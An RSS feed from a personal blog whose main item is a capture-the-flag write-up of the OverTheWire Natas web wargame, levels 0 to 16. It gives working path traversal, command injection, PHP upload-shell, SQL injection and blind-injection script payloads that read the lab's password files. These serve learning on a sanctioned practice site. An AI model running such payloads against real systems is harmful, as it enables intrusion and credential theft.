<?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>koolaidxk1d</title>
    <link>https://koolaidxk1d.github.io/</link>
    <description>Recent content on koolaidxk1d</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 21 Jun 2023 19:38:23 -0400</lastBuildDate>
    
        <atom:link href="https://koolaidxk1d.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    
    
        <item>
        <title>Infographics</title>
        <link>https://koolaidxk1d.github.io/posts/infographics/</link>
        <pubDate>Wed, 21 Jun 2023 19:38:23 -0400</pubDate>
        
        <guid>https://koolaidxk1d.github.io/posts/infographics/</guid>
        <description>koolaidxk1d https://koolaidxk1d.github.io/posts/infographics/ -&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/infographic0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
- https://koolaidxk1d.github.io/posts/infographics/ - </description>
        </item>
    
    
    
        <item>
        <title>OverTheWire: Natas</title>
        <link>https://koolaidxk1d.github.io/posts/natas/</link>
        <pubDate>Wed, 21 Jun 2023 18:16:32 -0400</pubDate>
        
        <guid>https://koolaidxk1d.github.io/posts/natas/</guid>
        <description>koolaidxk1d https://koolaidxk1d.github.io/posts/natas/ -&lt;p&gt;Back for more password hunting! This time we are doing a more web-oriented wargame. Similarly to leviathan, no hints are given on the webpage. This game provides no SSH access; everything is done in the browser.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;m lacking in web-dev knowledge to say the least, so this will be quite challenging.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-0&#34;&gt;Level 0&lt;/h2&gt;
&lt;p&gt;The password is right in your face the moment you look at the html.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas0-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-1&#34;&gt;Level 1&lt;/h2&gt;
&lt;p&gt;Same story as level 0, however the workaround is just using the hotkey to open the inspector.
&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas1-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-2&#34;&gt;Level 2&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas2-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;On this level, i can see a png file in the html. I decided to download it. I figured the password might be in the exif data, or perhaps in the raw bytes of the file itself.&lt;/p&gt;
&lt;p&gt;No dice&amp;hellip;&lt;/p&gt;
&lt;p&gt;Then I thought that maybe I just needed to hash the contents of the file&amp;hellip;.however the previous passwords were 32 char alphanumeric. To my knowledge that doesn&amp;rsquo;t follow the format of any hashing algorithms.&lt;/p&gt;
&lt;p&gt;I wracked my brain for way too long before I realized that the file was in the &lt;strong&gt;files/ subdirectory&lt;/strong&gt;. I felt like a total idiot when I realized.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas2-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Inside users.txt was the password I sought.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-3&#34;&gt;Level 3&lt;/h2&gt;
&lt;p&gt;I was stumped on this one for a while, until I thought harder about the comment in the html.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas3-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;Not even Google will find it&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;When Google indexes your website, you can prevent it from crawling certain directories by specifying them in a file called &amp;ldquo;robots.txt&amp;rdquo;. Because of the very concept of this file, it must be publicly available. We can therefore access it by typing it into the url bar.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas3-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s navigate there.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas3-2.png&#34; alt=&#34;&#34;&gt;
Once again, the pass is inside the txt.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-4&#34;&gt;Level 4&lt;/h2&gt;
&lt;p&gt;This level seems to be picky about the place from where I was linked to the website.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas4-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;There is an HTTP header included in GET requests that specifies the &amp;ldquo;referrer&amp;rdquo;. I believe we will have to spoof this to appear as though we are coming from natas5. I couldn&amp;rsquo;t find a way to do this natively in the inspector, as the referrer header is greyed out and cannot be edited. I decided to use this firefox extension:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://addons.mozilla.org/en-US/firefox/addon/referercontrol/&#34;&gt;https://addons.mozilla.org/en-US/firefox/addon/referercontrol/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Once I spoofed the referrer header I was given the password.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas4-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-5&#34;&gt;Level 5&lt;/h2&gt;
&lt;p&gt;&amp;ldquo;Access disallowed. You are not logged in.&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Well&amp;hellip;we are logged in using the password from the last level, but it seems there is another layer of access control on this level.&lt;/p&gt;
&lt;p&gt;My first instinct is to check the cookies.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas5-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;I set that to 1 and refreshed. Lo and behold, the password appeared.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-6&#34;&gt;Level 6&lt;/h2&gt;
&lt;p&gt;A text box labeled &amp;ldquo;Input secret: &amp;quot; and a submit button. The source code is available for this level. Let&amp;rsquo;s take a look.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas6-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;If we look at the beginning of the php section, we can see that a file at &amp;ldquo;includes/secret.inc&amp;rdquo; is included in the file, which is likely where the secret is stored.&lt;/p&gt;
&lt;p&gt;If we type that after the url we can direct the browser to the file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas6-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Copy the secret into the form and it returns the password to the next level.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-7&#34;&gt;Level 7&lt;/h2&gt;
&lt;p&gt;We have two links to different pages on the site. Opening the inspector gives us an interesting hint in the form of an html comment.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas7-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;It seems to want us to traverse to /etc/natas_webpass/ (where every user&amp;rsquo;s password resides).&lt;/p&gt;
&lt;p&gt;In the url we can see that a url parameter is used called page. It likely refers to the filename of the page we are visiting. It may be possible to use &amp;ldquo;../&amp;rdquo; to go up a directory and get us to the file we want.&lt;/p&gt;
&lt;p&gt;We can briefly test this by entering it once as the value. Now we get a warning shown:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas7-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;This is actually a good thing, because we can see that it is indeed taking us to different places within the filesystem. Additionally, since this warning is so verbose, we can see where we are. Using this information, we can easily format the url as follows to get to the password:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas7-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-8&#34;&gt;Level 8&lt;/h2&gt;
&lt;p&gt;Once again, a level is asking for a secret input. The source code is provided.&lt;/p&gt;
&lt;p&gt;In the source code, we can see the contents of the secret:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;levels/natas8-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can see the exact formula used to create the encoded secret. Following the nested operations, we should first convert the hex to its binary representation, then reverse it, and finally base64 decode it. We can do all of this very quickly and easily with &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas8-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Entering the output gets us the password to level 9.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-9&#34;&gt;Level 9&lt;/h2&gt;
&lt;p&gt;A search box allows us to search for a word in an unknown set of data. The site displays the search results under &amp;ldquo;Output:&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas9-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;In the source code we can see that the script is using passthru() to run linux commands on the system and direct stdout to the page.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas9-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Any time a user-facing input has direct access to run commands on the system, it should be inspected for possibility of exploitation. In this case, we can easily use some special shell characters to run our own commands.&lt;/p&gt;
&lt;p&gt;Take a look at &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/command-injection#command-injection-execution&#34;&gt;command injection overview&lt;/a&gt; to see how just a few of these special characters work. I am going to make $key equal to &lt;code&gt;. &amp;lt; /etc/natas_webpass/natas10 #&lt;/code&gt;. So the entire command executed will now be &lt;code&gt;grep -i . &amp;lt; /etc/natas_webpass/natas10 # dictionary.txt&lt;/code&gt;.
The dot tells grep to print indiscriminately. The (&amp;lt;) tells grep to get the data to search from the file mentioned afterward. The (#) is a character used to comment out the rest of the line; since we cannot remove the &amp;ldquo;dictionary.txt&amp;rdquo; part, we just comment it out.&lt;/p&gt;
&lt;p&gt;Inputting our new $key string gives us the contents of the password file.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-10&#34;&gt;Level 10&lt;/h2&gt;
&lt;p&gt;Looks like we have the same challenge again, except some characters are filtered out of the input.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas10-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s check and see which characters are not allowed.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas10-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;preg_match()&amp;rdquo; is a function which uses regex. As you can see it is checking for &amp;ldquo;/[;|&amp;amp;]/&amp;rdquo;. In regex terms, it is actually just looking for &amp;ldquo;;&amp;rdquo;, &amp;ldquo;|&amp;rdquo;,  or &amp;ldquo;&amp;amp;&amp;rdquo;. I did not use any of those in my solution so I can just reuse the previous solution (changing the filename obviously).&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-11&#34;&gt;Level 11&lt;/h2&gt;
&lt;p&gt;This is where this warbox starts to get challenging for me. The goal of this level seems to be to change the data cookie to the proper value so that the password will be revealed. The problem is that the cookie is XOR encrypted.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas11-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The page first checks if a saved cookie already exists. If it does, make sure that it is authentically encrypted with the XOR key. If it is, then load the values for background color and whether to show the password. If it is inauthentic, it will be rejected and the default &amp;ldquo;showpassword&amp;rdquo; value (&amp;ldquo;no&amp;rdquo;) will be used.&lt;/p&gt;
&lt;p&gt;So we obviously need to somehow create a json key-value pair with showpassword set to &amp;ldquo;yes&amp;rdquo; and encrypt it and place it into our cookies. But how can we encrypt without knowing the key?&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.101computing.net/xor-encryption-algorithm/&#34;&gt;XOR encryption&lt;/a&gt; is a larger topic which I will not write about, but to sum up the information relevant to this level I will point out that knowing the ciphertext and plaintext can actually make getting the key extremely simple.&lt;/p&gt;
&lt;p&gt;If C is the ciphertext, P is the plaintext, and K is the key, then we can say the following:&lt;/p&gt;
&lt;p&gt;C XOR P = K
P XOR K = C
C XOR K = P&lt;/p&gt;
&lt;p&gt;Great, so in our case what are the ciphertext and plaintext? Well, the plaintext would be the json encoding of $defaultdata, and the ciphertext would be found in our cookies! The ciphertext is base64 encoded as per the source code, so we first need to decode that.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;P: {&amp;quot;showpassword&amp;quot;: &amp;quot;no&amp;quot;, &amp;quot;bgcolor&amp;quot;: &amp;quot;#ffffff&amp;quot;}
C: 0l;$$98-8=?#9*jvi &#39;ngl*+(!$#9lrnh(.*-(.n6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To XOR these together I simply stole the source code, set the $key value to our plaintext, and called the xor_encrypt() function on the ciphertext. I ran it using a PHP interpreter and echoed the result.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas11-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The repeating characters are the key. &amp;ldquo;KNHL&amp;rdquo;. Now that we have the XOR key, all we have to do is encode our own cookie and place it in to the browser. I will once again use the source code to do this, but this time placing our key into $key, placing the modified json pair into the argument of xor_encrypt(), and running base64_encode on the result.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas11-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;To actually use our new cookie, we just need to replace the data cookie with our new value and refresh the page.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas11-3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-12&#34;&gt;Level 12&lt;/h2&gt;
&lt;p&gt;This level allows a file upload up to 1KB. It specifies that it needs to be a JPEG.&lt;/p&gt;
&lt;p&gt;At first glance, the best exploitation would probably be to somehow upload a PHP file instead of a JPEG to allow for remote code execution. First let&amp;rsquo;s just upload a blank php file to see if input validation measures are in place.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas12-0.jpg&#34; alt=&#34;&#34;&gt;
&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas12-1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Weird. The upload works, but the extension is changed to jpg. The source code is linked so let&amp;rsquo;s dig in.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas12-2.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The extension is defined by the input tag named &amp;ldquo;filename&amp;rdquo; in the form. We can directly edit the extension since it is declared explicitly in the html. Doing this before uploading the file will allow PHP uploads.&lt;/p&gt;
&lt;p&gt;Now that we bypassed the extension, we need to write a PHP script that will read out the password file to the screen. To run linux commands on the server we can use the passthru PHP function.&lt;/p&gt;
&lt;p&gt;Here is a simple script that will read the password file to the screen.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
	echo(passthru(&amp;quot;cat /etc/natas_webpass/natas13&amp;quot;));
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 id=&#34;level-13&#34;&gt;Level 13&lt;/h2&gt;
&lt;p&gt;This level seems to be the same as 12, but with one key difference: the script checks if the file is a legitimate jpeg.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas13-0.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Looking at the source code and comparing it to level 12&amp;rsquo;s, there is now an added conditional. The result of exif_imagetype() is checked before uploading the file. This means we can reuse the same solution from 12 as long as we can somehow make the function see the file as a jpeg.&lt;/p&gt;
&lt;p&gt;When a computer handles a file, the way it handles the file is different based on the filetype. The extension of the file is not the only thing that determines the filetype, and usually it is not even what the computer looks at to determine its compatibility. This is where the &lt;a href=&#34;https://en.wikipedia.org/wiki/List_of_file_signatures&#34;&gt;file signature&lt;/a&gt; comes in.&lt;/p&gt;
&lt;p&gt;File signatures, also called magic numbers, are arbitrary (probably) agreed upon combinations of hex bytes typically placed at the very beginning of a file that tell the computer what kind of data a file is storing. This is important because if a program treats a file wrong it can result in unpredictable behavior. The file signature for a jpeg file is 0xFF_D8_FF_DB.&lt;/p&gt;
&lt;p&gt;If we want to upload our PHP script and bypass the check, all we need to do is modify the file signature after writing the script. This can be done using any hex editor. Just insert the bytes before the existing contents.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas13-1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Using this file you can bypass check while still uploading a coherent script for the page to run and return the password to level 14.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-14&#34;&gt;Level 14&lt;/h2&gt;
&lt;p&gt;This page is asking us to login. It is likely that some type of database is involved considering we are inputting a user and password. Looking at the source code we can see it is using MySQL.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$query = &amp;quot;SELECT * from users where username=\&amp;quot;&amp;quot;.$_REQUEST[&amp;quot;username&amp;quot;].&amp;quot;\&amp;quot; and password=\&amp;quot;&amp;quot;.$_REQUEST[&amp;quot;password&amp;quot;].&amp;quot;\&amp;quot;&amp;quot;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The query gets the username and password from the form. We can actually format our response to include SQL phrases. This is called &lt;a href=&#34;https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#LineCommentAttacks&#34;&gt;SQL Injection&lt;/a&gt;. I will use a comment (#) to ignore the rest of the query. By doing so, I can specify a username without needing to match the password. In other words, I can override the original query to instead print out the details of the user of my choosing. The user I will enter is natas15. The input should then look like this:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;natas&amp;quot;#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas14-0.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-15&#34;&gt;Level 15&lt;/h2&gt;
&lt;p&gt;This level took me&amp;hellip;&lt;em&gt;a while&lt;/em&gt;; I spent so long staring at its source code trying to find a hole that wasn&amp;rsquo;t there. Eventually, I realized that it was staring back at me the whole time. Let me explain.&lt;/p&gt;
&lt;p&gt;Level 15 contains a search box asking for a username. When you enter it and submit the form, you have three possible responses: &amp;ldquo;user exists&amp;rdquo;, &amp;ldquo;user does not exist&amp;rdquo;, and &amp;ldquo;error in request&amp;rdquo;. There is an optional &amp;ldquo;debug&amp;rdquo; feature which can be activated by adding an extra input to the form and making a GET request rather than a POST. Below is the source code:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas15-0.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;reconnaissance&#34;&gt;Reconnaissance:&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;The table used on the mySQL database is presumably a table containing the columns &amp;ldquo;username&amp;rdquo; and &amp;ldquo;password&amp;rdquo; according to the source code comment.&lt;/li&gt;
&lt;li&gt;Checking the user &amp;ldquo;natas16&amp;rdquo; on the form shows us that it is on the table, so we can probably assume the password is in the password column of the table. This means we likely don&amp;rsquo;t need to somehow get the /etc/password file from the server, but rather we can get it solely by interfacing with the mySQL database.&lt;/li&gt;
&lt;li&gt;You can only get 3 possible responses from the submission.&lt;/li&gt;
&lt;li&gt;If we don&amp;rsquo;t count the error response, we are essentially getting yes or no answers to our questions.&lt;/li&gt;
&lt;li&gt;After a quick test input (&amp;rdquo; AND 1=1#), I can see the form is not protected against SQL injection, so that is still on the table.&lt;/li&gt;
&lt;li&gt;If we check the length of the password value using SQL function LENGTH(password) we get 32. That is the same length as every other level&amp;rsquo;s password, so it is definitely in the table.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;With the given information, it&amp;rsquo;s highly probable that I will have to find a way to return the password using SQL injection and interpreting binary responses in a way that tells us the password. The obvious answer here is char-by-char guessing.&lt;/p&gt;
&lt;p&gt;Each character of the password is alphanumeric, so each char has 62 possible values. If we multiply this by 32 characters in the password, we get 1,984. In other words, we only need to make 1,984 requests to the database. My testing shows that an average response from the server takes about a third of a second. So we can reasonably get the entire password in just a few minutes. So how do we actually go about guessing the letters? I&amp;rsquo;ve written a python script to do just that.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests

url = &amp;quot;http://natas15.natas.labs.overthewire.org&amp;quot;
credentials = (&amp;quot;natas15&amp;quot;, &amp;quot;{censored}&amp;quot;)
form_data = {&amp;quot;username&amp;quot;: &amp;quot;x&amp;quot;}
password=&amp;quot;&amp;quot;

alphanumeric_chars = [
&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;,
&#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;,
&#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,
&#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;,
&#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;,
&#39;y&#39;, &#39;z&#39;
]

for i in range(1, 33):
  for j in alphanumeric_chars:
    form_data[&amp;quot;username&amp;quot;] = f&amp;quot;natas16\&amp;quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#&amp;quot;
    
	# Make the cURL request
	
	response = requests.post(url, auth=credentials, data=form_data)
	
	if &amp;quot;exists&amp;quot; in response.text:
	  password += j

	print(f&amp;quot;Current guess: {i}{j}:&amp;quot;)
	print(&amp;quot;Status code:&amp;quot;, response.status_code)
	print(&amp;quot;Content:&amp;quot;, response.text)
	print(&amp;quot;--------------------&amp;quot;)
	print(f&amp;quot;password: {password}&amp;quot;)
	if &amp;quot;exists&amp;quot; in response.text:
      break
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;My concept is a two-dimensional loop. On the outside, iterating over the chars of the string (1-32) and, inside of that, iterating over possible values for those chars(a-z, A-Z, 0-9).&lt;/p&gt;
&lt;p&gt;On each iteration, I make a curl request to the site using the credentials and include a variable value for the &amp;ldquo;username&amp;rdquo; input depending on the current iteration. The form data contains SQL injection code in the username field. Then if a char is correct (meaning: the request response contains the word &amp;ldquo;exists&amp;rdquo;) then the char is appended to an undeclared password string variable and we break out of the loop to avoid guessing more chars that we know will be false.&lt;/p&gt;
&lt;p&gt;My SQL command given to the &amp;ldquo;username&amp;rdquo; field looks like this:
&lt;code&gt;natas16&amp;quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ve input natas16&amp;quot; to avoid an error, and then added the rest which compares the guess to the actual char of the password at the index defined by the current iteration.&lt;/p&gt;
&lt;p&gt;When I ran the script I got the password in a few minutes.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas15-1.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-16&#34;&gt;Level 16&lt;/h2&gt;
&lt;p&gt;Natas16 is revisiting the search form that executes grep which we found in 9 and 10. This time even more characters are filtered. To be precise, we can no longer use the following characters:&lt;/p&gt;
&lt;p&gt;; | &amp;amp; ` &#39; &amp;quot;&lt;/p&gt;
&lt;p&gt;and our input is placed in this PHP statement:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;passthru(&amp;quot;grep -i \&amp;quot;{input here}\&amp;quot; dictionary.txt);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This makes things quite a bit more challenging. After &lt;em&gt;extensive&lt;/em&gt; efforts, I can not find a way to escape the double quotes and override the execution of grep. This means we will have to find some way to do everything within the context of grepping the dictionary file.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Great.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Luckily the dollar-sign and parentheses are not filtered, so we can use command substitution. Command substitution allows you to execute command x within command y to use x&amp;rsquo;s output as an argument (or even just part of an argument) to command y. For example:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo $(echo hello)&lt;/code&gt; effectively runs as &lt;code&gt;echo hello&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Since the output of this page is just pattern matches of the dictionary file, we have to find a way to manipulate that mechanism to reflect information about the password.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas16-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;First I will try to determine the individual letters of the password. The dictionary does not have digits in it, so that part will have to wait. Also, the grep flag -i is in use, which tells grep to ignore case. That means we will also have to find a way to determine which letters are uppercase.&lt;/p&gt;
&lt;p&gt;A standard Linux utility called &amp;ldquo;cut&amp;rdquo; will help us with figuring out the letters. using command substitution, we can run &lt;code&gt;$(cut -c (number) /etc/natas_webpass/natas17)&lt;/code&gt; inside the double quotes of the command to only show words of the dictionary that contain the letter specified. For example, in the following picture, we can see that the first letter of the password must be &amp;lsquo;x&amp;rsquo;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas16-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Repeating this for all 32 characters gives us:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xkeuche-sbnkbvh-ru-ksib-uulmi-sd&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The hyphens are just arbitrary marks I placed when the output was blank. In other words, they must be numbers. Speaking of numbers, we now have to determine the numerical characters of the password&amp;hellip;&lt;/p&gt;
&lt;p&gt;One way we can use numbers in our grep search is with regex (Regular expressions). Instead of searching for particular spelling-based matches, we can search for lines of particular lengths. So If we use a regex formula that will find lines of length &amp;lsquo;a&amp;rsquo;, and we replace &amp;lsquo;a&amp;rsquo; with the specific char of the password (once again, using the &amp;lsquo;cut&amp;rsquo; command), then we should be able to tell what the number is based on the lengths of the lines in the output.&lt;/p&gt;
&lt;p&gt;Therefore, we shall use the following command:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;^.\{$(cut -c (number) /etc/natas_webpass/natas17)\}\$&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This is not a regex write-up, so I will not get too off-topic. Basically, the string above will look for lines of a particular length, and that length is filled in using a command substitution that returns the character at the desired index of the given file.&lt;/p&gt;
&lt;p&gt;The result looks like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas16-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;After running this on all of our missing numbers, we now have even more information about the password.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;xkeuche0sbnkbvh1ru7ksib9uulmi7sd&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;All we have to do now is determine the case of each character. This is especially tough because of the -i flag I mentioned earlier. We cannot return uppercase dictionary entries to show whether the chars are uppercase, because our searches will always ignore case.&lt;/p&gt;
&lt;p&gt;The way I have found to approach this is using our own grep search (for each alphabetical character) which does two case-sensitive searches against the char itself&amp;ndash;once for lowercase and once for uppercase. The result of the search will be blank if there is no match, and if there is a match then the result will be the char we searched. When applied to the dictionary search form, this means that if it is the correct case guess, the dictionary will only show words of that letter. If The guess is incorrect, then the dictionary will receive a blank search pattern (which will match all words in the dictionary). So we can clearly see through the response whether a char is uppercase.&lt;/p&gt;
&lt;p&gt;If this is confusing, I&amp;rsquo;ve made a terrible mspaint drawing to try to explain better. Observe.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas16-3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
